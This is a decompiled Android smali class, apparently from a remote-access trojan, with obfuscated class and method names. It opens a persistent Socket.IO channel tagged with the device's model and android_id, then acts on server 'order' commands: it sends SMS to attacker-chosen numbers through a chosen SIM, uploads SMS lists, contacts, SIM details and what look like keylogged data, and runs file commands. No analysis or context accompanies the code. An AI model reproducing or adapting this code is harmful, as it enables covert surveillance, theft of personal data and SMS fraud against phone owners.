.class public final La_0E958762;
.super Ljava/lang/Object;
# processed-73433
# compiled-38522
# generated-69408
.source "sgsuakjd.java"
# ep-edrmkmrniubu


# static fields
.field public static f:La_0E958762;

.field public static g:Landroid/content/Context;


# instance fields
.field public a:Lio/socket/client/Socket;

.field public b:Z

.field public c:Z

.field public d:J

.field public final e:Ljava/util/LinkedList;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 2

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 4
    const/4 v0, 0x0

    .line 5
    iput-boolean v0, p0, La_0E958762;->b:Z

    .line 7
    iput-boolean v0, p0, La_0E958762;->c:Z

    .line 9
    const-wide/16 v0, 0x0

    .line 11
    iput-wide v0, p0, La_0E958762;->d:J

    .line 13
    new-instance v0, Ljava/util/LinkedList;

    .line 15
    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    .line 18
    iput-object v0, p0, La_0E958762;->e:Ljava/util/LinkedList;

    .line 20
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 23
    move-result-object p1

    .line 24
    sput-object p1, La_0E958762;->g:Landroid/content/Context;

    .line 26
    invoke-virtual {p0}, La_0E958762;->b()V

    .line 29
    return-void
.end method

.method public static declared-synchronized a(Landroid/content/Context;)La_0E958762;
    .locals 2

    .line 1
    const-class v0, La_0E958762;

    .line 3
    monitor-enter v0

    .line 4
    :try_start_0
    sget-object v1, La_0E958762;->f:La_0E958762;

    .line 6
    if-nez v1, :cond_0

    .line 8
    new-instance v1, La_0E958762;

    .line 10
    invoke-direct {v1, p0}, La_0E958762;-><init>(Landroid/content/Context;)V

    .line 13
    sput-object v1, La_0E958762;->f:La_0E958762;

    .line 15
    :cond_0
    sget-object p0, La_0E958762;->f:La_0E958762;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 17
    monitor-exit v0

    .line 18
    return-object p0

    .line 19
    :catchall_0
    move-exception p0

    .line 20
    monitor-exit v0

    .line 21
    throw p0
.end method

.method public static g(Landroid/content/Context;)V
    .locals 1

    .line 1
    :try_start_0
    sput-object p0, La_0E958762;->g:Landroid/content/Context;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 3
    :try_start_1
    invoke-static {p0}, La_0E958762;->a(Landroid/content/Context;)La_0E958762;

    .line 6
    move-result-object p0

    .line 7
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 9
    if-nez v0, :cond_0

    .line 11
    invoke-virtual {p0}, La_0E958762;->b()V

    .line 14
    :cond_0
    iget-boolean v0, p0, La_0E958762;->b:Z

    .line 16
    if-nez v0, :cond_1

    .line 18
    invoke-virtual {p0}, La_0E958762;->f()V

    .line 21
    :cond_1
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 23
    invoke-virtual {v0}, Lio/socket/client/Socket;->connected()Z

    .line 26
    move-result v0

    .line 27
    if-nez v0, :cond_2

    .line 29
    iget-object p0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 31
    invoke-virtual {p0}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 34
    goto :goto_0

    .line 35
    :catch_0
    move-exception p0

    .line 36
    :try_start_2
    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 39
    :catch_1
    :cond_2
    :goto_0
    return-void
.end method

.method public static h(Landroid/content/Context;)V
    .locals 4

    .line 1
    invoke-static {p0}, La_0E958762;->a(Landroid/content/Context;)La_0E958762;

    .line 4
    move-result-object v0

    .line 5
    invoke-virtual {v0}, La_0E958762;->c()Z

    .line 8
    move-result v1

    .line 9
    if-nez v1, :cond_0

    .line 11
    return-void

    .line 12
    :cond_0
    :try_start_0
    iget-object v0, v0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 14
    const-string v1, "x0000ca"

    .line 16
    const/4 v2, 0x1

    .line 17
    new-array v2, v2, [Ljava/lang/Object;

    .line 19
    invoke-static {p0}, La_4305C20A;->a(Landroid/content/Context;)Lorg/json/JSONObject;

    .line 22
    move-result-object p0

    .line 23
    const/4 v3, 0x0

    .line 24
    aput-object p0, v2, v3

    .line 26
    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 29
    :catch_0
    return-void
.end method

.method public static i(Lorg/json/JSONObject;)V
    .locals 5

    .line 1
    const-string v0, "Failed to process file command: "

    .line 3
    sget-object v1, La_0E958762;->g:Landroid/content/Context;

    .line 5
    invoke-static {v1}, La_0E958762;->a(Landroid/content/Context;)La_0E958762;

    .line 8
    move-result-object v1

    .line 9
    invoke-virtual {v1}, La_0E958762;->c()Z

    .line 12
    move-result v2

    .line 13
    if-nez v2, :cond_0

    .line 15
    return-void

    .line 16
    :cond_0
    :try_start_0
    iget-object v2, v1, La_0E958762;->a:Lio/socket/client/Socket;

    .line 18
    invoke-static {p0, v2}, La_2C13166E;->m_da2b7611(Lorg/json/JSONObject;Lio/socket/client/Socket;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 21
    goto :goto_0

    .line 22
    :catch_0
    move-exception p0

    .line 23
    :try_start_1
    new-instance v2, Lorg/json/JSONObject;

    .line 25
    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 28
    const-string v3, "error"

    .line 30
    new-instance v4, Ljava/lang/StringBuilder;

    .line 32
    invoke-direct {v4, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 35
    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 38
    move-result-object p0

    .line 39
    invoke-virtual {v4, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 42
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 45
    move-result-object p0

    .line 46
    invoke-virtual {v2, v3, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 49
    iget-object p0, v1, La_0E958762;->a:Lio/socket/client/Socket;

    .line 51
    const-string v0, "x0000fm"

    .line 53
    const/4 v1, 0x1

    .line 54
    new-array v1, v1, [Ljava/lang/Object;

    .line 56
    const/4 v3, 0x0

    .line 57
    aput-object v2, v1, v3

    .line 59
    invoke-virtual {p0, v0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 62
    :catch_1
    :goto_0
    return-void
.end method

.method public static j(Lorg/json/JSONObject;)V
    .locals 4

    .line 1
    sget-object v0, La_0E958762;->g:Landroid/content/Context;

    .line 3
    invoke-static {v0}, La_0E958762;->a(Landroid/content/Context;)La_0E958762;

    .line 6
    move-result-object v0

    .line 7
    invoke-virtual {v0}, La_0E958762;->c()Z

    .line 10
    move-result v1

    .line 11
    if-eqz v1, :cond_0

    .line 13
    :try_start_0
    iget-object v0, v0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 15
    const-string v1, "x0000ka"

    .line 17
    const/4 v2, 0x1

    .line 18
    new-array v2, v2, [Ljava/lang/Object;

    .line 20
    const/4 v3, 0x0

    .line 21
    aput-object p0, v2, v3

    .line 23
    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 26
    :catch_0
    :cond_0
    return-void
.end method

.method public static k(IILandroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 5

    .line 1
    invoke-static {p2}, La_0E958762;->a(Landroid/content/Context;)La_0E958762;

    .line 4
    move-result-object v0

    .line 5
    invoke-virtual {v0}, La_0E958762;->c()Z

    .line 8
    move-result v1

    .line 9
    if-nez v1, :cond_0

    .line 11
    return-void

    .line 12
    :cond_0
    const/4 v1, 0x0

    .line 13
    const-string v2, "x0000sa"

    .line 15
    const/4 v3, 0x1

    .line 16
    if-nez p0, :cond_1

    .line 18
    :try_start_0
    iget-object p0, v0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 20
    new-array p1, v3, [Ljava/lang/Object;

    .line 22
    invoke-static {p2}, Luq;->b(Landroid/content/Context;)Lorg/json/JSONObject;

    .line 25
    move-result-object p2

    .line 26
    aput-object p2, p1, v1

    .line 28
    invoke-virtual {p0, v2, p1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 31
    goto :goto_2

    .line 32
    :cond_1
    if-ne p0, v3, :cond_4

    .line 34
    :try_start_1
    sget p0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 36
    const/16 v4, 0x16

    .line 38
    if-lt p0, v4, :cond_2

    .line 40
    if-eqz p2, :cond_2

    .line 42
    invoke-static {p2}, Lp;->d(Landroid/content/Context;)Landroid/telephony/SubscriptionManager;

    .line 45
    move-result-object p0

    .line 46
    const-string v4, "android.permission.READ_PHONE_STATE"

    .line 48
    invoke-static {p2, v4}, La_6B590370;->a(Landroid/content/Context;Ljava/lang/String;)I

    .line 51
    move-result v4

    .line 52
    if-nez v4, :cond_2

    .line 54
    invoke-static {p0, p1}, Lp;->c(Landroid/telephony/SubscriptionManager;I)Landroid/telephony/SubscriptionInfo;

    .line 57
    move-result-object p0

    .line 58
    if-eqz p0, :cond_2

    .line 60
    invoke-static {p0}, Lp;->f(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    .line 63
    move-result-object v4

    .line 64
    if-eqz v4, :cond_2

    .line 66
    invoke-static {p0}, Lp;->h(Landroid/telephony/SubscriptionInfo;)V

    .line 69
    invoke-static {p0}, Lp;->f(Landroid/telephony/SubscriptionInfo;)Ljava/lang/String;

    .line 72
    move-result-object p0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 73
    goto :goto_0

    .line 74
    :catch_0
    move-exception p0

    .line 75
    :try_start_2
    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 78
    :cond_2
    const/4 p0, 0x0

    .line 79
    :goto_0
    if-eqz p0, :cond_3

    .line 81
    invoke-static {p3, p4, p0, p2}, Luq;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)Z

    .line 84
    move-result p0

    .line 85
    goto :goto_1

    .line 86
    :cond_3
    invoke-static {p1, p2, p3, p4}, Luq;->d(ILandroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    .line 89
    move-result p0

    .line 90
    :goto_1
    iget-object p1, v0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 92
    new-array p2, v3, [Ljava/lang/Object;

    .line 94
    invoke-static {p0}, Ljava/lang/Boolean;->m_446e0ad6(Z)Ljava/lang/Boolean;

    .line 97
    move-result-object p0

    .line 98
    aput-object p0, p2, v1

    .line 100
    invoke-virtual {p1, v2, p2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 103
    goto :goto_2

    .line 104
    :catch_1
    :try_start_3
    iget-object p0, v0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 106
    new-array p1, v3, [Ljava/lang/Object;

    .line 108
    sget-object p2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    .line 110
    aput-object p2, p1, v1

    .line 112
    invoke-virtual {p0, v2, p1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 115
    :catch_2
    :cond_4
    :goto_2
    return-void
.end method

.method public static l()V
    .locals 5

    .line 1
    sget-object v0, La_0E958762;->g:Landroid/content/Context;

    .line 3
    invoke-static {v0}, La_0E958762;->a(Landroid/content/Context;)La_0E958762;

    .line 6
    move-result-object v0

    .line 7
    invoke-virtual {v0}, La_0E958762;->c()Z

    .line 10
    move-result v1

    .line 11
    if-nez v1, :cond_0

    .line 13
    return-void

    .line 14
    :cond_0
    :try_start_0
    iget-object v0, v0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 16
    const-string v1, "x0000sim"

    .line 18
    const/4 v2, 0x1

    .line 19
    new-array v2, v2, [Ljava/lang/Object;

    .line 21
    sget-object v3, La_0E958762;->g:Landroid/content/Context;

    .line 23
    invoke-static {v3}, Luq;->c(Landroid/content/Context;)Lorg/json/JSONObject;

    .line 26
    move-result-object v3

    .line 27
    const/4 v4, 0x0

    .line 28
    aput-object v3, v2, v4

    .line 30
    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 33
    :catch_0
    return-void
.end method


# virtual methods
.method public final b()V
    .locals 5

    .line 1
    const-string v0, "model="

    .line 3
    :try_start_0
    sget-object v1, La_0E958762;->g:Landroid/content/Context;

    .line 5
    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 8
    move-result-object v1

    .line 9
    const-string v2, "android_id"

    .line 11
    invoke-static {v1, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    .line 14
    move-result-object v1

    .line 15
    new-instance v2, Lio/socket/client/IO$Options;

    .line 17
    invoke-direct {v2}, Lio/socket/client/IO$Options;-><init>()V

    .line 20
    const-wide/16 v3, -0x1

    .line 22
    iput-wide v3, v2, Lio/socket/client/Manager$Options;->timeout:J

    .line 24
    const/4 v3, 0x1

    .line 25
    iput-boolean v3, v2, Lio/socket/client/Manager$Options;->reconnection:Z

    .line 27
    const-wide/16 v3, 0x1388

    .line 29
    iput-wide v3, v2, Lio/socket/client/Manager$Options;->reconnectionDelay:J

    .line 31
    const-wide/32 v3, 0x3b9ac9ff

    .line 34
    iput-wide v3, v2, Lio/socket/client/Manager$Options;->reconnectionDelayMax:J

    .line 36
    new-instance v3, Ljava/lang/StringBuilder;

    .line 38
    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 41
    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    .line 43
    invoke-static {v0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    .line 46
    move-result-object v0

    .line 47
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 50
    const-string v0, "&manf="

    .line 52
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 55
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    .line 57
    invoke-static {v0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    .line 60
    move-result-object v0

    .line 61
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 64
    const-string v0, "&release="

    .line 66
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 69
    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 71
    invoke-static {v0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    .line 74
    move-result-object v0

    .line 75
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 78
    const-string v0, "&id="

    .line 80
    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 83
    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 86
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 89
    move-result-object v0

    .line 90
    iput-object v0, v2, Lio/socket/engineio/client/Socket$Options;->query:Ljava/lang/String;

    .line 92
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 94
    if-eqz v0, :cond_0

    .line 96
    invoke-virtual {p0}, La_0E958762;->e()V

    .line 99
    :cond_0
    const-string v0, "Null"

    .line 101
    invoke-static {v0, v2}, Lio/socket/client/IO;->socket(Ljava/lang/String;Lio/socket/client/IO$Options;)Lio/socket/client/Socket;

    .line 104
    move-result-object v0

    .line 105
    iput-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    .line 107
    goto :goto_0

    .line 108
    :catch_0
    move-exception v0

    .line 109
    invoke-virtual {v0}, Ljava/net/URISyntaxException;->getMessage()Ljava/lang/String;

    .line 112
    :goto_0
    return-void
.end method

.method public final c()Z
    .locals 1

    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Lio/socket/client/Socket;->connected()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method public final d()V
    .locals 11

    .line 1
    const-string v0, "simId"

    .line 3
    const-string v1, "extra"

    .line 5
    iget-boolean v2, p0, La_0E958762;->c:Z

    .line 7
    if-nez v2, :cond_b

    .line 9
    iget-object v2, p0, La_0E958762;->e:Ljava/util/LinkedList;

    .line 11
    invoke-interface {v2}, Ljava/util/Collection;->m_2bd5aeca()Z

    .line 14
    move-result v3

    .line 15
    if-eqz v3, :cond_0

    .line 17
    goto/16 :goto_3

    .line 19
    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 22
    move-result-wide v3

    .line 23
    iget-wide v5, p0, La_0E958762;->d:J

    .line 25
    sub-long v5, v3, v5

    .line 27
    const-wide/16 v7, 0x64

    .line 29
    cmp-long v9, v5, v7

    .line 31
    if-gez v9, :cond_1

    .line 33
    new-instance v0, Landroid/os/Handler;

    .line 35
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 38
    move-result-object v1

    .line 39
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 42
    new-instance v1, La_F9202322;

    .line 44
    const/4 v2, 0x5

    .line 45
    invoke-direct {v1, v2, p0}, La_F9202322;-><init>(ILjava/lang/Object;)V

    .line 48
    invoke-virtual {v0, v1, v7, v8}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 51
    return-void

    .line 52
    :cond_1
    const/4 v5, 0x1

    .line 53
    iput-boolean v5, p0, La_0E958762;->c:Z

    .line 55
    invoke-virtual {v2}, Ljava/util/LinkedList;->poll()Ljava/lang/Object;

    .line 58
    move-result-object v2

    .line 59
    check-cast v2, Lorg/json/JSONObject;

    .line 61
    iput-wide v3, p0, La_0E958762;->d:J

    .line 63
    const/4 v3, 0x0

    .line 64
    :try_start_0
    const-string v4, "order"

    .line 66
    invoke-virtual {v2, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    .line 69
    move-result-object v4

    .line 70
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    .line 73
    move-result v6

    .line 74
    const/4 v7, -0x1

    .line 75
    const/4 v8, 0x2

    .line 76
    const/4 v9, 0x3

    .line 77
    const/4 v10, 0x4

    .line 78
    sparse-switch v6, :sswitch_data_0

    .line 81
    goto :goto_0

    .line 82
    :sswitch_0
    const-string v6, "x0000sa"

    .line 84
    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 87
    move-result v4

    .line 88
    if-eqz v4, :cond_2

    .line 90
    const/4 v4, 0x0

    .line 91
    goto :goto_1

    .line 92
    :sswitch_1
    const-string v6, "x0000ka"

    .line 94
    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 97
    move-result v4

    .line 98
    if-eqz v4, :cond_2

    .line 100
    const/4 v4, 0x2

    .line 101
    goto :goto_1

    .line 102
    :sswitch_2
    const-string v6, "x0000fm"

    .line 104
    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 107
    move-result v4

    .line 108
    if-eqz v4, :cond_2

    .line 110
    const/4 v4, 0x4

    .line 111
    goto :goto_1

    .line 112
    :sswitch_3
    const-string v6, "x0000ca"

    .line 114
    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 117
    move-result v4

    .line 118
    if-eqz v4, :cond_2

    .line 120
    const/4 v4, 0x1

    .line 121
    goto :goto_1

    .line 122
    :sswitch_4
    const-string v6, "x0000sim"

    .line 124
    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 127
    move-result v4

    .line 128
    if-eqz v4, :cond_2

    .line 130
    const/4 v4, 0x3

    .line 131
    goto :goto_1

    .line 132
    :cond_2
    :goto_0
    const/4 v4, -0x1

    .line 133
    :goto_1
    if-eqz v4, :cond_7

    .line 135
    if-eq v4, v5, :cond_6

    .line 137
    if-eq v4, v8, :cond_5

    .line 139
    if-eq v4, v9, :cond_4

    .line 141
    if-eq v4, v10, :cond_3

    .line 143
    goto :goto_2

    .line 144
    :cond_3
    invoke-static {v2}, La_0E958762;->i(Lorg/json/JSONObject;)V

    .line 147
    goto :goto_2

    .line 148
    :cond_4
    invoke-static {}, La_0E958762;->l()V

    .line 151
    goto :goto_2

    .line 152
    :cond_5
    invoke-static {v2}, La_0E958762;->j(Lorg/json/JSONObject;)V

    .line 155
    goto :goto_2

    .line 156
    :cond_6
    sget-object v0, La_0E958762;->g:Landroid/content/Context;

    .line 158
    invoke-static {v0}, La_0E958762;->h(Landroid/content/Context;)V

    .line 161
    goto :goto_2

    .line 162
    :cond_7
    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    .line 165
    move-result v4

    .line 166
    if-eqz v4, :cond_a

    .line 168
    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    .line 171
    move-result-object v4

    .line 172
    const-string v6, "ls"

    .line 174
    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 177
    move-result v4

    .line 178
    if-eqz v4, :cond_8

    .line 180
    sget-object v0, La_0E958762;->g:Landroid/content/Context;

    .line 182
    const/4 v1, 0x0

    .line 183
    invoke-static {v3, v7, v0, v1, v1}, La_0E958762;->k(IILandroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 186
    goto :goto_2

    .line 187
    :cond_8
    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    .line 190
    move-result-object v1

    .line 191
    const-string v4, "sendSMS"

    .line 193
    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 196
    move-result v1

    .line 197
    if-eqz v1, :cond_a

    .line 199
    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    .line 202
    move-result v1

    .line 203
    if-eqz v1, :cond_9

    .line 205
    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    .line 208
    move-result v7

    .line 209
    :cond_9
    const-string v0, "to"

    .line 211
    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    .line 214
    move-result-object v0

    .line 215
    const-string v1, "sms"

    .line 217
    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    .line 220
    move-result-object v1

    .line 221
    sget-object v2, La_0E958762;->g:Landroid/content/Context;

    .line 223
    invoke-static {v5, v7, v2, v0, v1}, La_0E958762;->k(IILandroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 226
    goto :goto_2

    .line 227
    :catchall_0
    move-exception v0

    .line 228
    iput-boolean v3, p0, La_0E958762;->c:Z

    .line 230
    invoke-virtual {p0}, La_0E958762;->d()V

    .line 233
    throw v0

    .line 234
    :catch_0
    :cond_a
    :goto_2
    iput-boolean v3, p0, La_0E958762;->c:Z

    .line 236
    invoke-virtual {p0}, La_0E958762;->d()V

    .line 239
    :cond_b
    :goto_3
    return-void

    .line 240
    nop

    .line 241
    :sswitch_data_0
    .sparse-switch
        -0xea346a1 -> :sswitch_4
        0x208f5ed6 -> :sswitch_3
        0x208f5f3f -> :sswitch_2
        0x208f5fce -> :sswitch_1
        0x208f60c6 -> :sswitch_0
    .end sparse-switch
.end method

.method public final e()V
    .locals 2

    .line 1
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 3
    if-eqz v0, :cond_0

    .line 5
    const-string v1, "ping"

    .line 7
    invoke-virtual {v0, v1}, Lio/socket/emitter/Emitter;->off(Ljava/lang/String;)Lio/socket/emitter/Emitter;

    .line 10
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 12
    const-string v1, "order"

    .line 14
    invoke-virtual {v0, v1}, Lio/socket/emitter/Emitter;->off(Ljava/lang/String;)Lio/socket/emitter/Emitter;

    .line 17
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 19
    const-string v1, "connect"

    .line 21
    invoke-virtual {v0, v1}, Lio/socket/emitter/Emitter;->off(Ljava/lang/String;)Lio/socket/emitter/Emitter;

    .line 24
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 26
    const-string v1, "disconnect"

    .line 28
    invoke-virtual {v0, v1}, Lio/socket/emitter/Emitter;->off(Ljava/lang/String;)Lio/socket/emitter/Emitter;

    .line 31
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 33
    const-string v1, "connect_error"

    .line 35
    invoke-virtual {v0, v1}, Lio/socket/emitter/Emitter;->off(Ljava/lang/String;)Lio/socket/emitter/Emitter;

    .line 38
    :cond_0
    return-void
.end method

.method public final f()V
    .locals 4

    .line 1
    iget-boolean v0, p0, La_0E958762;->b:Z

    .line 3
    if-nez v0, :cond_0

    .line 5
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 7
    new-instance v1, La_9DD0C8E4;

    .line 9
    const/4 v2, 0x0

    .line 10
    invoke-direct {v1, p0, v2}, La_9DD0C8E4;-><init>(La_0E958762;I)V

    .line 13
    const-string v3, "connect"

    .line 15
    invoke-virtual {v0, v3, v1}, Lio/socket/emitter/Emitter;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 18
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 20
    new-instance v1, La_592FFB92;

    .line 22
    invoke-direct {v1, p0, v2}, La_592FFB92;-><init>(La_0E958762;I)V

    .line 25
    const-string v2, "disconnect"

    .line 27
    invoke-virtual {v0, v2, v1}, Lio/socket/emitter/Emitter;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 30
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 32
    new-instance v1, La_9DD0C8E4;

    .line 34
    const/4 v2, 0x1

    .line 35
    invoke-direct {v1, p0, v2}, La_9DD0C8E4;-><init>(La_0E958762;I)V

    .line 38
    const-string v3, "connect_error"

    .line 40
    invoke-virtual {v0, v3, v1}, Lio/socket/emitter/Emitter;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 43
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 45
    new-instance v1, La_592FFB92;

    .line 47
    invoke-direct {v1, p0, v2}, La_592FFB92;-><init>(La_0E958762;I)V

    .line 50
    const-string v3, "ping"

    .line 52
    invoke-virtual {v0, v3, v1}, Lio/socket/emitter/Emitter;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 55
    iget-object v0, p0, La_0E958762;->a:Lio/socket/client/Socket;

    .line 57
    new-instance v1, La_9DD0C8E4;

    .line 59
    const/4 v3, 0x2

    .line 60
    invoke-direct {v1, p0, v3}, La_9DD0C8E4;-><init>(La_0E958762;I)V

    .line 63
    const-string v3, "order"

    .line 65
    invoke-virtual {v0, v3, v1}, Lio/socket/emitter/Emitter;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 68
